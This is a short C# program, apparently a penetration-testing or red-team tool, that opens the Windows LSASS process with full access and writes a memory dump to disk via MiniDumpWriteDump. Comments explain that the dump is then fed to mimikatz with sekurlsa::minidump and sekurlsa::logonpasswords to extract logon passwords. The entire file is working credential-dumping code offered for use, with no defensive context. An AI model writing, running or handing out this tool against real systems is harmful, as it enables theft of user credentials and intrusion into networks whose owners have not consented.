//This program creates a proces dump of the LSASS process, so that then you can parse its contents with mimikatz.
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
  IntPtr hFile, int DumpType, IntPtr ExceptionParam,
  IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
  int processId);

        static void Main(string[] args)
        {
            if (args.Length == 0) {
                Console.WriteLine("[!] Usage: .\\minidump.exe outputfile");
                Console.WriteLine("[!] Example: .\\minidump C:\\Windows\\tasks\\lsass.dmp");
                return;
            }
            String outputfile = args[0];
            Console.WriteLine("[+] The outputfile is: " + args[0]);
            FileStream dumpFile = new FileStream(outputfile, FileMode.Create);

            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);

            //Convert the file handle in to a C-Style handle
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            //once we have the dump do this with mimikatz; 1st sekurlsa::minidump lsass.dmp     2nd sekurlsa::logonpasswords
        }
    }
}
